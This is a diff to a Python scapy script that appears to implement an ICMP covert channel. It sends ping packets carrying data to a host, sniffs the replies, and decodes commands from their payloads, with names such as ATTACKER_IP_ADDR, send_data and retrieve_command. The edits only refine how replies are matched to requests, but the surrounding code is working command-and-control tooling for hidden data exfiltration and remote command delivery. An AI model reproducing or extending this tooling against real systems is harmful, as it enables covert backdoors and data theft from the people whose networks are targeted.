@@ -19,7 +19,7 @@ def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=1):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
     print("Sending packet:", request.show())
-    return receive_response_packet(timeout, nb_responses)
+    return receive_response_packet(request, timeout, nb_responses)
 
 
 def send_data(ip_addr, id, data):
@@ -69,9 +69,10 @@ def retrieve_command(response):
     return response[scapy.ICMP].payload.load.decode("utf-8").split()  # forge_random_command().decode("utf-8").split()
 
 
-def receive_response_packet(timeout, nb_responses):
+def receive_response_packet(request, timeout, nb_responses):
     print("Start Receiving packet")
-    packet = scapy.sniff(filter=f"icmp and host {ATTACKER_IP_ADDR}", count=nb_responses, timeout=timeout)
+    packet = scapy.sniff(lfilter=lambda response: match_response_to_request(response, request),
+                         count=nb_responses, timeout=timeout)
     print("End Receiving packet:", packet.show())
     return packet
 
@@ -83,7 +84,8 @@ def can_proceed(ip_addr):
 
 def match_response_to_request(response, request):
     print(response.show(), request.show())
-    return response[scapy.IP].src == request[scapy.IP].dst \
+    return response.haslayer(scapy.ICMP) \
+        and response[scapy.IP].src == request[scapy.IP].dst \
         and response[scapy.IP].dst == request[scapy.IP].src \
         and response[scapy.ICMP] and response[scapy.ICMP].type == 0 \
         and response[scapy.ICMP].id == request[scapy.ICMP].id \
